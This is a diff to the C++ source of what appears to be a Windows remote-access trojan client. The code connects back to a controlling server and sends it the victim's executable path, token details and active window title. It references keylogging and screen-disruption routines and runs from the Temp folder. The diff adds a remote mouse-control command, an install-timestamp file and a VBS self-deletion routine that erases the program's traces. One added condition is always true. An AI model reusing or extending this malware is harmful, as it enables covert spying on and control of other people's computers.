@@ -19,6 +19,7 @@ bool v5=true;
 bool v6=true;
 bool v7=true;
 bool v8=true;
+bool v9=true;
 SOCKET Client;
 addrinfo Server;
 TCHAR name[30]={0};
@@ -30,6 +31,7 @@ char ctsk[7]={0};
 int simb=0;
 int bott=0;
 int LagCount=0;
+int data=0;
 
 using namespace std;
 
@@ -53,6 +55,7 @@ void LiveKey(SOCKET);
 void Lag();
 bool SocketConnected(SOCKET);
 void RandPixel();
+void DataInst();
 
 ///////////////////////////////////////////////////////////////MAIN
 
@@ -63,6 +66,7 @@ int main()
 		if(preliminari())
 			return 0;
 	//InitKeylog();
+	DataInst();
 	int PORTA=5555;//RIF
 	int check=0;
 	if(initSock()!=-1)
@@ -237,7 +241,7 @@ void ricevi(SOCKET s)
 			if(msg[0]=='H' && msg[1]=='H')
 			{
 				cout<<"<Server> Client restart."<<endl;
-				system("start test.exe");//3RIF
+				system("start SES.exe");//3RIF
 				v2=false;
 				v3=false;
 				v4=false;
@@ -522,7 +526,7 @@ void ricevi(SOCKET s)
 			            if(NULL!=hProcess)
 					    {
 					    	GetModuleFileNameEx(hProcess, 0, szProcessName, MAX_PATH);
-					        if(szProcessName[0]!='<')
+					        if(szProcessName[0]!='<' || szProcessName[0]!='?')
 						    {
 						    	for(int cnt=MAX_PATH;cnt>0;cnt--)
 						    	{
@@ -554,7 +558,7 @@ void ricevi(SOCKET s)
 			            if(NULL!=hProcess)
 					    {
 					    	GetModuleFileNameEx(hProcess, 0, szProcessName, MAX_PATH);
-					    	if(szProcessName[0]!='<')
+					    	if(szProcessName[0]!='<' || szProcessName[0]!='?')
 						    {
 						    	for(int cnt=MAX_PATH;cnt>0;cnt--)
 						    	{
@@ -607,6 +611,40 @@ void ricevi(SOCKET s)
 			{
 				cout<<"<Server> RandPix OFF."<<endl;
 				v8=false;
+			}
+			if(msg[0]=='V' && msg[1]=='V')
+			{
+				cout<<"<Server> MouseTrack ON."<<endl;
+				char Cx[5]={0};
+				char Cy[5]={0};
+				char Px[5]={0};
+				char Py[5]={0};
+				int Lmax_x=GetSystemMetrics(SM_CXSCREEN)+1;
+				int Lmax_y=GetSystemMetrics(SM_CYSCREEN)+1;
+				int Rmax_x;
+				int Rmax_y;
+				POINT pos;
+				recv(s,Cx,sizeof(Cx),0);
+				recv(s,Cy,sizeof(Cy),0);
+				Rmax_x=atoi(Cx)+1;
+				Rmax_y=atoi(Cy)+1;
+				for(v9=true;v9;)
+				{
+					recv(s,Px,sizeof(Px),0);
+					if(Px[0]=='s' && Px[1]=='t' && Px[2]=='o' && Px[3]=='p')
+						v9=false;
+					if(v9)
+						recv(s,Py,sizeof(Py),0);
+					if(Py[0]=='s' && Py[1]=='t' && Py[2]=='o' && Py[3]=='p')
+						v9=false;
+					if(v9)
+					{
+						pos.x=atoi(Px)+1;
+						pos.y=atoi(Py)+1;
+						SetCursorPos((int)((float)pos.x/(float)Rmax_x*Lmax_x),(int)((float)pos.y/(float)Rmax_y*Lmax_y));
+					}
+				}
+				cout<<"<Server> MouseTrack OFF."<<endl;
 			}
 		}
 		else
@@ -710,7 +748,7 @@ bool preliminari()
 	DWORD cchComputerName = 256;
 	char n[256]={'~'};
 	char p1[256]="\"C:\\Users\\";
-	char p2[256]="\\AppData\\Local\\Temp\\test.exe\"";//2RIF
+	char p2[256]="\\AppData\\Local\\Temp\\SES.exe\"";//2RIF
 	char pF[256]={'\0'};
 	char pFC[256]={'\0'};
 	char cmd[256]="start \"\" ";
@@ -850,7 +888,7 @@ void GETINFO(SOCKET s)
 	GetModuleFileName(NULL,buff,MAX_PATH);
 	send(s,buff,sizeof(buff),0);
 	
-	char ver[50]="1.0.6";
+	char ver[50]="1.1.0";
 	send(s,ver,sizeof(ver),0);
 	
 	if(OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hToken))
@@ -871,6 +909,9 @@ void GETINFO(SOCKET s)
     HWND hwnd=GetForegroundWindow();
     GetWindowText(hwnd,wnd_title,sizeof(wnd_title));
     send(s,wnd_title,sizeof(wnd_title),0);
+    
+    char Cdata[15]={0}; sprintf(Cdata,"%d",data);
+    send(s,Cdata,sizeof(Cdata),0);
 	
 	return;
 }
@@ -935,9 +976,11 @@ void DelClient()
 	
 	char bufferEXE[MAX_PATH];
 	char bufferVBS[MAX_PATH];
+	char bufferDAT[MAX_PATH];
 	char cmd[MAX_PATH]="start \"\" ";
 	GetModuleFileName( NULL, bufferEXE, MAX_PATH );
 	GetModuleFileName( NULL, bufferVBS, MAX_PATH );
+	GetModuleFileName( NULL, bufferDAT, MAX_PATH );
 	
 	for(int i=1;i<MAX_PATH;i++)
 	{
@@ -960,10 +1003,31 @@ void DelClient()
 		}
 	}
 	
+	for(int i=1;i<MAX_PATH;i++)
+	{
+		if(bufferDAT[i]=='T' && bufferDAT[i+1]=='e' && bufferDAT[i+2]=='m' && bufferDAT[i+3]=='p' && bufferDAT[i+4]=='\\')
+		{
+			bufferDAT[i+5]='z';
+			bufferDAT[i+6]='z';
+			bufferDAT[i+7]='D';
+			bufferDAT[i+8]='A';
+			bufferDAT[i+9]='T';
+			bufferDAT[i+10]='A';
+			bufferDAT[i+11]='z';
+			bufferDAT[i+12]='z';
+			i+=13;
+			while(i<200)
+			{
+				bufferDAT[i]=0;
+				i++;
+			}
+		}
+	}
+	
 	ofstream outfile;
 	
 	outfile.open(bufferVBS);
-	outfile<<"WScript.Sleep 10000\ndim filesys\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nfilesys.DeleteFile \""<<bufferEXE<<"\"\nfilesys.DeleteFile \""<<bufferVBS<<"\"\n";
+	outfile<<"WScript.Sleep 10000\ndim filesys\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nfilesys.DeleteFile \""<<bufferEXE<<"\"\nfilesys.DeleteFile \""<<bufferDAT<<"\"\nfilesys.DeleteFile \""<<bufferVBS<<"\"\n";
 	outfile.close();
 	
 	for(int i=9;i<MAX_PATH;i++)
@@ -981,6 +1045,44 @@ void DelClient()
 	}
 	
 	system(cmd);
+	
+	return;
+}
+
+void DataInst()
+{
+	ifstream infile;
+	ofstream outfile;
+	
+	char nomeFile[30]="zzDATAzz";
+	char buff[MAX_PATH];
+	GetModuleFileName(NULL,buff,MAX_PATH);
+	
+	for(int i=0;i<MAX_PATH;i++)
+	{
+		if(buff[i]=='\\' && buff[i-1]=='p' && buff[i-2]=='m' && buff[i-3]=='e' && buff[i-4]=='T')
+		{
+			for(int ii=1;ii<30;ii++)
+			{
+				buff[i+ii]=nomeFile[ii-1];
+			}
+		}
+	}
+	
+	infile.open(buff);
+	infile>>data;
+	infile.close();
+	
+	if(data==0)
+	{
+		data=time(0);
+		
+		outfile.open(buff);
+		outfile<<data;
+		outfile.close();
+	}
+	
+	
 	
 	return;
 }
